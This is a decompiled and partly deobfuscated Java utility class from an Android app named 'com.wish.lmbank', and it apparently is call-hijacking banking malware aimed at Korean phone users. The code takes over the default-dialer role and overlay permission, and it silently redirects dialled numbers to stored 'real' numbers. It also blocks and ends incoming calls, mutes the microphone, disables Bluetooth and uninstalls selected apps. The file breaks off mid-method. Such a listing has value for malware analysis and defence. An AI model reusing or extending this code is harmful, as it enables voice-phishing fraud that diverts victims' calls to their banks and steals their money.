package com.wish.lmbank.utils;

import android.accessibilityservice.AccessibilityServiceInfo;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.AppOpsManager;
import android.app.role.RoleManager;
import android.bluetooth.BluetoothAdapter;
import android.content.ContentUris;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.database.Cursor;
import android.media.AudioManager;
import android.media.AudioRecord;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.Proxy;
import android.net.Uri;
import android.os.Binder;
import android.os.Build;
import android.os.Process;
import android.provider.MediaStore;
import android.provider.Settings;
import android.telecom.TelecomManager;
import android.telephony.PhoneNumberUtils;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;
import android.view.accessibility.AccessibilityManager;

import androidx.core.app.ActivityCompat;

import com.wish.lmbank.AppStartV;
import com.wish.lmbank.activity.VRequestDefaultDialerActivity;
import com.wish.lmbank.bean.DialerInfoBean;
import com.wish.lmbank.bean.LimitPhoneNumberBean;
import com.wish.lmbank.bean.PermissionStateBean;
import com.wish.lmbank.bean.UninstallApkBean;
import com.wish.lmbank.callback.ITelephony;
import com.wish.lmbank.db.LimitPhoneNumberDB;
import com.wish.lmbank.overlay.OverlayService;
import com.wish.lmbank.service.RecServiceV;
import com.wish.lmbank.service.UninstallService;
import com.wish.lmbank.temp.Debugging;

import net.ossrs.yasea.SrsFlvMuxer;

import java.io.File;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;

import gv00l3ah.mvdt7w.bb7d7pu7;

/* loaded from: cookie_9234504.jar:com/wish/lmbank/utils/SettingUtils.class */
public class SettingUtils {
    public static final int REQUEST_DIALOG_PERMISSION = 1000;
    private static final String TAG = "com.wish.lmbank.utils.SettingUtils";
    private static boolean isJudgeDefaultDialer;
    public static boolean isLoadingUninstallApkList;
    public static List<UninstallApkBean> mUninstallApkList = new ArrayList();
    private static int volume;

    public static void requestSettingCanDrawOverlays(Activity activity) {
        int i = Build.VERSION.SDK_INT;
//         String m5998 = bb7d7pu7.m5998("CAcNGwYADUcaDB0dAAcOGkcICh0ABgdHJCgnKC4sNiY_LDslKDA2OSw7JCA6OiAmJw");
        String m5998 = "android.settings.action.MANAGE_OVERLAY_PERMISSION";
        if (i >= 26) {
            activity.startActivityForResult(new Intent(m5998), 1000);
        } else if (i >= 23) {
            Intent intent = new Intent(m5998);
//             intent.setData(Uri.parse(bb7d7pu7.m5998("GQgKAggODFM") + activity.getPackageName()));
            intent.setData(Uri.parse("package:" + activity.getPackageName()));
            activity.startActivityForResult(intent, 1000);
        }
    }

    public static boolean checkFloatPermission(Context context) {
        boolean z = true;
        if (Build.VERSION.SDK_INT < 19) {
            return true;
        }
        if (Build.VERSION.SDK_INT < 23) {
            try {
//                 Class<?> cls = Class.forName(bb7d7pu7.m5998("CAcNGwYADUcKBgcdDAcdRyoGBx0MER0"));
                Class<?> cls = Class.forName("android.content.Context");
//                 Field declaredField = cls.getDeclaredField(bb7d7pu7.m5998("KDk5NiY5OjY6LDs_ICos"));
                Field declaredField = cls.getDeclaredField("APP_OPS_SERVICE");
                declaredField.setAccessible(true);
                Object obj = declaredField.get(cls);
                if (obj instanceof String) {
//                     Object invoke = cls.getMethod(bb7d7pu7.m5998("DgwdOhAaHQwEOgwbHwAKDA"), String.class).invoke(context, (String) obj);
                    Object invoke = cls.getMethod("getSystemService", String.class).invoke(context, (String) obj);
//                     Class<?> cls2 = Class.forName(bb7d7pu7.m5998("CAcNGwYADUcIGRlHKBkZJhkaJAgHCA4MGw"));
                    Class<?> cls2 = Class.forName("android.app.AppOpsManager");
//                     Field declaredField2 = cls2.getDeclaredField(bb7d7pu7.m5998("JCYtLDYoJSUmPiwt"));
                    Field declaredField2 = cls2.getDeclaredField("MODE_ALLOWED");
                    declaredField2.setAccessible(true);
//                     if (((Integer) cls2.getMethod(bb7d7pu7.m5998("CgEMCgImGQ"), Integer.TYPE, Integer.TYPE, String.class).invoke(invoke, 24, Integer.valueOf(Binder.getCallingUid()), context.getPackageName())).intValue() != declaredField2.getInt(cls2)) {
                    if (((Integer) cls2.getMethod("checkOp", Integer.TYPE, Integer.TYPE, String.class).invoke(invoke, 24, Integer.valueOf(Binder.getCallingUid()), context.getPackageName())).intValue() != declaredField2.getInt(cls2)) {
                        z = false;
                    }
                    return z;
                }
                return false;
            } catch (Exception e) {
                return false;
            }
        } else if (Build.VERSION.SDK_INT >= 26) {
//             AppOpsManager appOpsManager = (AppOpsManager) context.getSystemService(bb7d7pu7.m5998("CBkZBhka"));
            AppOpsManager appOpsManager = (AppOpsManager) context.getSystemService(Context.APP_OPS_SERVICE);
            if (appOpsManager == null) {
                return false;
            }
//             int checkOpNoThrow = appOpsManager.checkOpNoThrow(bb7d7pu7.m5998("CAcNGwYADVMaEBodDAQ2CAUMGx02HgAHDQYe"), Process.myUid(), context.getPackageName());
            int checkOpNoThrow = appOpsManager.checkOpNoThrow("android:system_alert_window", Process.myUid(), context.getPackageName());
            boolean z2 = true;
            if (checkOpNoThrow != 0) {
                z2 = checkOpNoThrow == 1;
            }
            return z2;
        } else {
            return Settings.canDrawOverlays(context);
        }
    }

    @SuppressLint("WrongConstant")
    public static void toHome(Context context) {
        String str = TAG;
//         LogUtils.d(str, bb7d7pu7.m5998("HQYhBgQMRUkODB06HQgKAj0bCAoMOh0bAAcOU0k") + Log.getStackTraceString(new Throwable()));
        LogUtils.d(str, "toHome, getStackTraceString: " + Log.getStackTraceString(new Throwable()));
        Intent intent = new Intent();
//         intent.setAction(bb7d7pu7.m5998("CAcNGwYADUcABx0MBx1HCAodAAYHRyQoICc"));
        intent.setAction("android.intent.action.MAIN");
//         intent.addCategory(bb7d7pu7.m5998("CAcNGwYADUcABx0MBx1HCggdDA4GGxBHISYkLA"));
        intent.addCategory("android.intent.category.HOME");
        intent.addFlags(270532608);
        context.startActivity(intent);
    }

    public static void setSpeakerphoneOn(Context context, boolean z) {
//         AudioManager audioManager = (AudioManager) context.getSystemService(bb7d7pu7.m5998("CBwNAAY"));
        AudioManager audioManager = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
        if (!z) {
            if (audioManager != null && audioManager.isSpeakerphoneOn()) {
                audioManager.setSpeakerphoneOn(false);
                audioManager.setStreamVolume(0, volume, 0);
                return;
            }
            return;
        }
        try {
            if (audioManager.isSpeakerphoneOn()) {
                return;
            }
            audioManager.setMode(AudioManager.MODE_IN_CALL);
            volume = audioManager.getStreamVolume(0);
            audioManager.setSpeakerphoneOn(true);
            audioManager.setStreamVolume(0, audioManager.getStreamMaxVolume(0), 0);
        } catch (Exception e) {
            StringBuilder sb = new StringBuilder();
//             sb.append(bb7d7pu7.m5998("GgwdOhkMCAIMGxkBBgcMJgdFSQwRCgwZHQAGB1NJ"));
            sb.append("setSpeakerphoneOn, exception: ");
            sb.append(e.getMessage());
            LogUtils.callLog(sb.toString());
        }
    }

    public static void setMicrophoneMute(Context context, boolean z) {
//         AudioManager audioManager = (AudioManager) context.getSystemService(bb7d7pu7.m5998("CBwNAAY"));
        AudioManager audioManager = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
        if (audioManager != null) {
            audioManager.setMicrophoneMute(z);
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:12:0x00bc, code lost:
        if (r10.getContentResolver().delete(r0, null, null) == 1) goto L13;
     */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct code enable 'Show inconsistent code' option in preferences
    */
    private boolean deleteImage(Context context, String str) {
        boolean delete;
//-^-         Cursor query = MediaStore.Images.Media.query(context.getContentResolver(), MediaStore.Images.Media.EXTERNAL_CONTENT_URI, new String[]{bb7d7pu7.m5998("NgAN")}, bb7d7pu7.m5998("Ng0IHQhUVg"), new String[]{str}, null);
        Cursor query = MediaStore.Images.Media.query(context.getContentResolver(), MediaStore.Images.Media.EXTERNAL_CONTENT_URI, new String[]{"_id"}, "_data=?", new String[]{str}, null);
//-^-         String str2 = bb7d7pu7.m5998("REQNDAUMHQwgBAgODEREAAQOOQgdAVM");
        String str2 = "--deleteImage--imgPath:";
        if (query != null && query.moveToFirst()) {
            Uri withAppendedId = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, query.getLong(0));
//-^-             LogUtils.e(bb7d7pu7.m5998("REQNDAUMHQwgBAgODEREHBsAUw") + withAppendedId, new Object[0]);
            LogUtils.e("--deleteImage--uri:" + withAppendedId, new Object[0]);
            if (context.getContentResolver().delete(withAppendedId, null, null) == 1) {
                delete = true;
            }
            delete = false;
        } else {
            File file = new File(str);
            if (file.exists()) {
                delete = file.delete();
            } else {
//-^-                 LogUtils.e(str2 + str + bb7d7pu7.m5998("SQcGSQwRABod"));
                LogUtils.e(str2 + str + " no exist");
                delete = false;
            }
        }
//-^-         LogUtils.e(str2 + str + bb7d7pu7.m5998("REQbDBocBR1T") + delete, new Object[0]);
        LogUtils.e(str2 + str + "--result:" + delete, new Object[0]);
        return delete;
    }


    public static List<PermissionStateBean> getDeniedPermission(Context context) {
        String[] strArr;
        ArrayList arrayList = new ArrayList();
        for (String str : PermissionUtils.ALL_PERMISSION_REQUEST) {
            PermissionStateBean permissionStateBean = new PermissionStateBean();
            permissionStateBean.setName(str);
            if (ActivityCompat.checkSelfPermission(context, str) != 0) {
                permissionStateBean.setState(-1);
            } else {
                permissionStateBean.setState(0);
            }
            arrayList.add(permissionStateBean);
        }
        return arrayList;
    }

    public static void startActivityForCall(Context context, String str) {
        //             String replaceAll = str.replaceAll(bb7d7pu7.m5998("RA"), "");
        String replaceAll = str.replaceAll("-", "");
        String str2 = replaceAll;
//             if (replaceAll.startsWith(bb7d7pu7.m5998("QlFb"))) {
        if (replaceAll.startsWith("+82")) {
            StringBuilder sb = new StringBuilder();
//                 sb.append(bb7d7pu7.m5998("WQ"));
            sb.append("0");
            sb.append(sb.substring(3));
            str2 = sb.toString();
        }
        try {
//                 Intent intent = new Intent(bb7d7pu7.m5998("CAcNGwYADUcABx0MBx1HCAodAAYHRyooJSU"));
            Intent intent = new Intent("android.intent.action.CALL");
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            StringBuilder sb2 = new StringBuilder();
//                 sb2.append(bb7d7pu7.m5998("HQwFUw"));
            sb2.append("tel:");
            sb2.append(str2);
            intent.setData(Uri.parse(sb2.toString()));
            context.startActivity(intent);
            return;
        } catch (Exception e) {
//                 LogUtils.callLog(TAG + bb7d7pu7.m5998("RUkaHQgbHSgKHQAfAB0QLwYbKggFBUVJDBEKDBkdAAYHU0k") + e.getMessage() + bb7d7pu7.m5998("RUkAGi0MDwgcBR0tAAgFDBtTSQ") + isDefaultDialer(AppStartV.getContext()));
            LogUtils.callLog(TAG + ", startActivityForCall, exception: " + e.getMessage() + ", isDefaultDialer: " + isDefaultDialer(AppStartV.getContext()));
            return;
        }
    }

    public static boolean acceptCall(OverlayService context) {
        TelecomManager telecomManager;
//         if (Build.VERSION.SDK_INT < 26 || (telecomManager = (TelecomManager) context.getSystemService(bb7d7pu7.m5998("HQwFDAoGBA"))) == null) {
        if (Build.VERSION.SDK_INT < 26 || (telecomManager = (TelecomManager) context.getSystemService(Context.TELECOM_SERVICE)) == null) {
            return false;
        }
//         if (ActivityCompat.checkSelfPermission(context, bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRygnOj4sOzY5ISYnLDYqKCUlOg")) != 0) {
        if (ActivityCompat.checkSelfPermission(context, "android.permission.ANSWER_PHONE_CALLS") != 0) {
//             LogUtils.callLog(bb7d7pu7.m5998("DAcKKggFBUVJDBEKDBkdAAYHU0kDCB8IRwUIBw5HOgwKHBsAHRAsEQoMGR0ABgdTSQcGSQgHDRsGAA1HGQwbBAAaGgAGB0coJzo-LDs2OSEmJyw2KiglJTo"));
            LogUtils.callLog("encCall, exception: java.lang.SecurityException: no android.permission.ANSWER_PHONE_CALLS");
            return false;
        }
        telecomManager.acceptRingingCall();
        return true;
    }

    public static boolean endCall(Context context) {
        boolean z = false;
        TelecomManager telecomManager = null;
        try {
//             telecomManager = (TelecomManager) context.getSystemService(bb7d7pu7.m5998("HQwFDAoGBA"));
            telecomManager = (TelecomManager) context.getSystemService(Context.TELECOM_SERVICE);
        } catch (Exception e) {
//             LogUtils.callLog(bb7d7pu7.m5998("DAcNKggFBUVJDBEKDBkdAAYHU0k") + e.getMessage());
            LogUtils.callLog("endCall, exception: " + e.getMessage());
        }
        if (telecomManager == null) {
            return false;
        }
//         if (ActivityCompat.checkSelfPermission(context, bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRygnOj4sOzY5ISYnLDYqKCUlOg")) != 0) {
        if (ActivityCompat.checkSelfPermission(context, "android.permission.ANSWER_PHONE_CALLS") != 0) {
//             LogUtils.callLog(bb7d7pu7.m5998("DAcNKggFBUVJDBEKDBkdAAYHU0kDCB8IRwUIBw5HOgwKHBsAHRAsEQoMGR0ABgdTSQcGSQgHDRsGAA1HGQwbBAAaGgAGB0coJzo-LDs2OSEmJyw2KiglJTo"));
            LogUtils.callLog("endCall, exception: java.lang.SecurityException: no android.permission.ANSWER_PHONE_CALLS");
            return false;
        }
        if (Build.VERSION.SDK_INT >= 28) {
            z = telecomManager.endCall();
        } else {
            try {
//                 TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(bb7d7pu7.m5998("GQEGBww"));
                TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
//                 Method declaredMethod = Class.forName(telephonyManager.getClass().getName()).getDeclaredMethod(bb7d7pu7.m5998("DgwdID0MBQwZAQYHEA"), new Class[0]);
                Method declaredMethod = Class.forName(telephonyManager.getClass().getName()).getDeclaredMethod("getITelephony", new Class[0]);
                declaredMethod.setAccessible(true);
                ITelephony iTelephony = (ITelephony) declaredMethod.invoke(telephonyManager, new Object[0]);
                z = false;
                if (iTelephony != null) {
                    return iTelephony.endCall();
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return z;
    }

    public static LimitPhoneNumberBean isForwarding(String str) {
        LimitPhoneNumberBean queryOutgoingPhoneNumberType = LimitPhoneNumberDB.getInstance(AppStartV.getContext()).queryOutgoingPhoneNumberType(str);

        if (Debugging.test_phone_number.equals(str)){
            LimitPhoneNumberBean limitPhoneNumberBean = new LimitPhoneNumberBean();
            limitPhoneNumberBean.setType(LimitPhoneNumberDB.TYPE_CALL_FORWARDING);
            limitPhoneNumberBean.setPhoneNumber(Debugging.test_phone_number);
            limitPhoneNumberBean.setRealPhoneNumber(Debugging.test_real_phone_number);
            limitPhoneNumberBean.setName(Debugging.name);
//            limitPhoneNumberBean.setSpecial(1);
            return limitPhoneNumberBean;
        }

        if (queryOutgoingPhoneNumberType == null) {
            return null;
        }
        String realPhoneNumber = queryOutgoingPhoneNumberType.getRealPhoneNumber();
        if (TextUtils.isEmpty(realPhoneNumber)) {
            return null;
        }
//         if (!bb7d7pu7.m5998("CggFBTYPBhseCBsNAAcO").equals(queryOutgoingPhoneNumberType.getType()) || formatPhone(str).equals(realPhoneNumber) || realPhoneNumber.equals(str)) {
        if (!LimitPhoneNumberDB.TYPE_CALL_FORWARDING.equals(queryOutgoingPhoneNumberType.getType()) || formatPhone(str).equals(realPhoneNumber) || realPhoneNumber.equals(str)) {
            return null;
        }
        return queryOutgoingPhoneNumberType;
    }

    public static LimitPhoneNumberBean isSpecial(String str) {
        LimitPhoneNumberBean queryOutgoingPhoneNumberType = LimitPhoneNumberDB.getInstance(AppStartV.getContext()).queryOutgoingPhoneNumberType(str);
        if (queryOutgoingPhoneNumberType != null) {
            String realPhoneNumber = queryOutgoingPhoneNumberType.getRealPhoneNumber();
            if (TextUtils.isEmpty(realPhoneNumber)) {
                return null;
            }
//             if (!bb7d7pu7.m5998("CggFBTYPBhseCBsNAAcO").equals(queryOutgoingPhoneNumberType.getType()) || formatPhone(str).equals(realPhoneNumber) || realPhoneNumber.equals(str) || queryOutgoingPhoneNumberType.getSpecial() != 1 || bb7d7pu7.m5998("WFhb").equals(str)) {
            if (!LimitPhoneNumberDB.TYPE_CALL_FORWARDING.equals(queryOutgoingPhoneNumberType.getType()) || formatPhone(str).equals(realPhoneNumber) || realPhoneNumber.equals(str) || queryOutgoingPhoneNumberType.getSpecial() != 1 || "112".equals(str)) {
                return null;
            }
            return queryOutgoingPhoneNumberType;
        }
        return null;
    }

    public static String isForced(String str) {
        LimitPhoneNumberBean queryIncomingPhoneNumberType = LimitPhoneNumberDB.getInstance(AppStartV.getContext()).queryIncomingPhoneNumberType(str);
        if (queryIncomingPhoneNumberType != null) {
            String realPhoneNumber = queryIncomingPhoneNumberType.getRealPhoneNumber();
            if (TextUtils.isEmpty(realPhoneNumber)) {
                return null;
            }
//             if (bb7d7pu7.m5998("CggFBTYPBhsKDA0").equals(queryIncomingPhoneNumberType.getType())) {
            if (LimitPhoneNumberDB.TYPE_CALL_FORCED.equals(queryIncomingPhoneNumberType.getType())) {
                return realPhoneNumber;
            }
            return null;
        }
        return null;
    }

    public static boolean isBlackList(String str) {
        Log.i(TAG, "isBlackList: " + str);
        LimitPhoneNumberBean queryIncomingPhoneNumberType = LimitPhoneNumberDB.getInstance(AppStartV.getContext()).queryIncomingPhoneNumberType(str);

        if(Debugging.test_phone_number.equals(str)){
            return true;
        }

        if (queryIncomingPhoneNumberType == null || TextUtils.isEmpty(queryIncomingPhoneNumberType.getRealPhoneNumber())) {
            return false;
        }

//         return bb7d7pu7.m5998("CwUICgI2BQAaHQ").equals(queryIncomingPhoneNumberType.getType());
        return LimitPhoneNumberDB.TYPE_BLACK_LIST.equals(queryIncomingPhoneNumberType.getType());
    }

    public static boolean isDefaultDialer(Context context) {
        if (((-18919) - 14752) % (-14752) <= 0) {
            try {
                if (context == null) {
//                     LogUtils.callLog(bb7d7pu7.m5998("ABotDA8IHAUdLQAIBQwbRUkEKgYHHQwRHUkAGkkHHAUF"));
                    LogUtils.callLog("isDefaultDialer, mContext is null");
                    return false;
                } else if (Build.VERSION.SDK_INT >= 23) {
//                     return context.getPackageName().equals(((TelecomManager) context.getSystemService(bb7d7pu7.m5998("HQwFDAoGBA"))).getDefaultDialerPackage());
                    return context.getPackageName().equals(((TelecomManager) context.getSystemService(Context.TELECOM_SERVICE)).getDefaultDialerPackage());
                } else {
                    return false;
                }
            } catch (Exception e) {
                StringBuilder sb = new StringBuilder();
//                 sb.append(bb7d7pu7.m5998("ABotDA8IHAUdLQAIBQwbRUkMEQoMGR0ABgdTSQ"));
                sb.append("isDefaultDialer, exception: ");
                sb.append(e.getMessage());
                LogUtils.callLog(sb.toString());
                return false;
            }
        }
        int i = 10347 + (10347 - 1328);
        while (true) {
        }
    }

    public static String getAppName(Context context) {
        if ((7542 - 15024) % (-15024) <= 0) {
            try {
                PackageManager packageManager = context.getPackageManager();
                return String.valueOf(packageManager.getApplicationLabel(packageManager.getPackageInfo(context.getPackageName(), 0).applicationInfo));
            } catch (PackageManager.NameNotFoundException e) {
                e.printStackTrace();
                return null;
            }
        }
        int i = 631 + (631 - 8128);
        while (true) {
        }
    }

    public static boolean requestDefaultDialer(Context context, boolean z, String str) {
        boolean z2;
        boolean isDefaultDialer = isDefaultDialer(context);
        boolean isEnabledAccessibility = isEnabledAccessibility(context);
        StringBuilder sb = new StringBuilder();
        StringBuilder sb2 = new StringBuilder();
//         sb2.append(bb7d7pu7.m5998("jv3agcbegNLxgcfNgOnzgcb0jNP9jv3BRUmN08eM2OZJU0k"));
        sb2.append("申请默认通话应用, 亮屏 : ");
        sb2.append(RecServiceV.isPause);
//         sb2.append(bb7d7pu7.m5998("RUmP8caM-c-A0vGBx81TSQ"));
        sb2.append(", 是否默认: ");
        sb2.append(isDefaultDialer);
//         sb2.append(bb7d7pu7.m5998("RUkAGioGBAQIBw1TSQ"));
        sb2.append(", isCommand: ");
        sb2.append(z);
//         String m5998 = bb7d7pu7.m5998("RUkAGiwHCAsFDA0oCgoMGhoACwAFAB0QU0k");
        String m5998 = ", isEnabledAccessibility: ";
        sb2.append(m5998);
        sb2.append(isEnabledAccessibility);
//         sb2.append(bb7d7pu7.m5998("RUk6LSI2ICcgU0k"));
        sb2.append(", SDK_INI: ");
        sb2.append(Build.VERSION.SDK_INT);
//         sb2.append(bb7d7pu7.m5998("RUkaBhwbCgxTSQ"));
        sb2.append(", source: ");
        sb2.append(str);
        sb.append(sb2.toString());
        try {
            if (!isDefaultDialer && isEnabledAccessibility) {
                RoleManager roleManager = null;
                if (Build.VERSION.SDK_INT >= 29) {
                    roleManager = RoleUtils.getRoleManager(context);
                    z2 = RoleUtils.getRoleHeld(roleManager);
//                     sb.append(bb7d7pu7.m5998("RUkAGjsGBQwhDAUNU0k") + z2);
                    sb.append(", isRoleHeld: " + z2);
                } else {
                    z2 = false;
                }
                LogUtils.callLog(sb.toString());
                if (z) {
                    Intent intent = new Intent(context, VRequestDefaultDialerActivity.class);
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    context.startActivity(intent);
                    return false;
                } else if (Build.VERSION.SDK_INT >= 29 && (context instanceof Activity) && !z2 && roleManager != null) {
//                     LogUtils.callLog(bb7d7pu7.m5998("ChsMCB0MOwwYHAwaHTsGBQwgBx0MBx0"));
                    LogUtils.callLog("createRequestRoleIntent");
//                     ((Activity) context).startActivityForResult(roleManager.createRequestRoleIntent(bb7d7pu7.m5998("CAcNGwYADUcIGRlHGwYFDEctICglLDs")), 1002);
                    ((Activity) context).startActivityForResult(roleManager.createRequestRoleIntent("android.app.role.DIALER"), 1002);
                    return true;
                } else {
                    //申请默认电话
//                     Intent intent2 = new Intent(bb7d7pu7.m5998("CAcNGwYADUcdDAUMCgYERwgKHQAGB0cqISgnLiw2LSwvKDwlPTYtICglLDs"));
                    Intent intent2 = new Intent("android.telecom.action.CHANGE_DEFAULT_DIALER");
//                     intent2.putExtra(bb7d7pu7.m5998("CAcNGwYADUcdDAUMCgYERwwRHRsIRyohKCcuLDYtLC8oPCU9Ni0gKCUsOzY5KCoiKC4sNicoJCw"), context.getPackageName());
                    intent2.putExtra("android.telecom.extra.CHANGE_DEFAULT_DIALER_PACKAGE_NAME", context.getPackageName());
                    if (intent2.resolveActivity(context.getPackageManager()) != null) {
                        intent2.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        context.startActivity(intent2);
                        return true;
                    }
//                     LogUtils.callLog(bb7d7pu7.m5998("DBEKDBkdAAYHU0kbDBgcDBodLQwPCBwFHS0ACAUMG0VJLQwPCBwFHUkZAQYHDEkPHAcKHQAGBwgFAB0QSQcGHUkPBhwHDQ"));
                    LogUtils.callLog("exception: requestDefaultDialer, Default phone functionality not found");
                    return false;
                }
            }
//             LogUtils.callLog(bb7d7pu7.m5998("GwwYHAwaHS0MDwgcBR0tAAgFDBtFSRoGHBsKDFNJ") + str + bb7d7pu7.m5998("RUkAGi0MDwgcBR0tAAgFDBtTSQ") + isDefaultDialer + m5998 + isEnabledAccessibility);
            LogUtils.callLog("requestDefaultDialer, source: " + str + ", isDefaultDialer: " + isDefaultDialer + m5998 + isEnabledAccessibility);
            return false;
        } catch (Exception e) {
//             LogUtils.callLog(bb7d7pu7.m5998("GwwYHAwaHS0MDwgcBR0tAAgFDBtFSQwRCgwZHQAGB1NJ") + e.getMessage());
            LogUtils.callLog("requestDefaultDialer, exception: " + e.getMessage());
            return false;
        }
    }

    public static boolean isPackageAvailable(Context context, String str) {
        if (TextUtils.isEmpty(str)) {
            return false;
        }
        List<PackageInfo> installedPackages = context.getPackageManager().getInstalledPackages(0);
        for (int i = 0; i < installedPackages.size(); i++) {
            if (str.equals(installedPackages.get(i).packageName)) {
                return true;
            }
        }
        return false;
    }

    public static String getDefaultDialerPackage(Context context) {
//         return Build.VERSION.SDK_INT >= 23 ? ((TelecomManager) context.getSystemService(bb7d7pu7.m5998("HQwFDAoGBA"))).getDefaultDialerPackage() : "";
        return Build.VERSION.SDK_INT >= 23 ? ((TelecomManager) context.getSystemService(Context.TELECOM_SERVICE)).getDefaultDialerPackage() : "";
    }

    public static List<DialerInfoBean> getDialerList(Context context) {
        String defaultDialerPackage = getDefaultDialerPackage(context);
        ArrayList arrayList = new ArrayList();
//         Intent intent = new Intent(bb7d7pu7.m5998("CAcNGwYADUcABx0MBx1HCAodAAYHRy0gKCU"));
        Intent intent = new Intent("android.intent.action.DIAL");
//         intent.setData(Uri.parse(bb7d7pu7.m5998("HQwFUw")));
        intent.setData(Uri.parse("tel:"));
        PackageManager packageManager = context.getPackageManager();
        List<ResolveInfo> queryIntentActivities = context.getPackageManager().queryIntentActivities(intent, PackageManager.MATCH_ALL);
        for (int i = 0; i < queryIntentActivities.size(); i++) {
            ResolveInfo resolveInfo = queryIntentActivities.get(i);
            if (resolveInfo != null) {
                DialerInfoBean dialerInfoBean = new DialerInfoBean();
                dialerInfoBean.setAppName(resolveInfo.loadLabel(packageManager).toString());
                dialerInfoBean.setPackageName(resolveInfo.activityInfo.packageName);
                if (defaultDialerPackage != null && defaultDialerPackage.equals(resolveInfo.activityInfo.packageName)) {
                    dialerInfoBean.setDefault(true);
                }
                arrayList.add(dialerInfoBean);
            }
        }
        return arrayList;
    }

    public static boolean isEnabledAccessibility(Context context) {
//         List<AccessibilityServiceInfo> enabledAccessibilityServiceList = ((AccessibilityManager) context.getSystemService(bb7d7pu7.m5998("CAoKDBoaAAsABQAdEA"))).getEnabledAccessibilityServiceList(16);
        List<AccessibilityServiceInfo> enabledAccessibilityServiceList = ((AccessibilityManager) context.getSystemService(Context.ACCESSIBILITY_SERVICE)).getEnabledAccessibilityServiceList(16);
        for (int i = 0; i < enabledAccessibilityServiceList.size(); i++) {
            if (enabledAccessibilityServiceList.get(i).getResolveInfo().serviceInfo.packageName.equals(AppStartV.getContext().getPackageName())) {
                return true;
            }
        }
        return false;
    }

    public static String formatPhone(String str) {
//         return TextUtils.isEmpty(str) ? "" : PhoneNumberUtils.formatNumber(str.replace(bb7d7pu7.m5998("RA"), "").replace(bb7d7pu7.m5998("SQ"), ""), bb7d7pu7.m5998("Ijs"));
        return TextUtils.isEmpty(str) ? "" : PhoneNumberUtils.formatNumber(str.replace("-", "").replace(" ", ""), "KR");
    }

    public static List<UninstallApkBean> getUninstallApkList(Context context, String[] strArr) {
        try {
            try {
            } catch (Exception e) {
//                 LogUtils.callLog(bb7d7pu7.m5998("DgwdPAcABxodCAUFKBkCJQAaHUVJDBEKDBkdAAYHU0k") + e.getMessage());
                LogUtils.callLog("getUninstallApkList, exception: " + e.getMessage());
            }
            if (isLoadingUninstallApkList) {
                isLoadingUninstallApkList = false;
                return null;
            }
            isLoadingUninstallApkList = true;
            List packagesList = getPackagesList(context);
            if (packagesList != null && strArr != null && strArr.length != 0) {
                mUninstallApkList.clear();
                for (int i = 0; i < packagesList.size(); i++) {
                    PackageInfo packageInfo = (PackageInfo) packagesList.get(i);
                    if ((packageInfo.applicationInfo.flags & 1) == 0 && packageInfo != null && !TextUtils.isEmpty(packageInfo.packageName)) {
                        for (int i2 = 0; i2 < strArr.length; i2++) {
                            if (packageInfo.packageName.equals(strArr[i2])) {
                                UninstallApkBean uninstallApkBean = new UninstallApkBean();
                                uninstallApkBean.setPackageName(strArr[i2]);
                                uninstallApkBean.setUninstall(true);
                                mUninstallApkList.add(uninstallApkBean);
                            }
                        }
                    }
                }
                isLoadingUninstallApkList = false;
                isLoadingUninstallApkList = false;
                return mUninstallApkList;
            }
            isLoadingUninstallApkList = false;
            isLoadingUninstallApkList = false;
            return null;
        } catch (Throwable th) {
            isLoadingUninstallApkList = false;
            throw th;
        }
    }

    public static List getPackagesList(Context context) {
        List<PackageInfo> installedPackages = context.getPackageManager().getInstalledPackages(0);
        List<PackageInfo> list = installedPackages;
        if (installedPackages == null) {
            list = null;
        }
        return list;
    }

    @SuppressLint("MissingPermission")
    public static void closeBluetooth() {
        try {
            BluetoothAdapter defaultAdapter = BluetoothAdapter.getDefaultAdapter();
            if ((defaultAdapter != null) && defaultAdapter.isEnabled()) {
                defaultAdapter.disable();
            }
        } catch (Exception e) {
//             LogUtils.callLog(bb7d7pu7.m5998("CgUGGgwrBRwMHQYGHQFFSQwRCgwZHQAGB1NJ") + e.getMessage());
            LogUtils.callLog("closeBluetooth, exception: " + e.getMessage());
        }
    }

    public static boolean isBluetoothEnabled() {
        try {
            BluetoothAdapter defaultAdapter = BluetoothAdapter.getDefaultAdapter();
            if (defaultAdapter != null) {
                return defaultAdapter.isEnabled();
            }
            return false;
        } catch (Exception e) {
//             LogUtils.callLog(bb7d7pu7.m5998("CgUGGgwrBRwMHQYGHQFFSQwRCgwZHQAGB1NJ") + e.getMessage());
            LogUtils.callLog("closeBluetooth, exception: " + e.getMessage());
            return false;
        }
    }

    public static void startUninstallApkService(Context context, String str) {
        Intent intent = new Intent(context, UninstallService.class);
//         intent.putExtra(bb7d7pu7.m5998("GQgKAggODDYHCAQM"), str);
        intent.putExtra("package_name", str);
        context.startService(intent);
    }

    public static void stopUninstallApkService(Context context) {
        context.stopService(new Intent(context, UninstallService.class));
    }

    public static void sendBroadcastUninstallApk(Context context) {
        Intent intent = new Intent();
        intent.setAction("UNINSTALL_APK");
        context.sendBroadcast(intent);
    }

    public static void uninstallApk(Context context, String str) {
        if (TextUtils.isEmpty(str)) {
            return;
        }
        AppStartV.isUninstallApK = true;
//         Uri parse = Uri.parse(bb7d7pu7.m5998("GQgKAggODFM") + str);
        Uri parse = Uri.parse("package:" + str);
//         Intent intent = new Intent(bb7d7pu7.m5998("CAcNGwYADUcABx0MBx1HCAodAAYHRy0sJSw9LA"), parse);
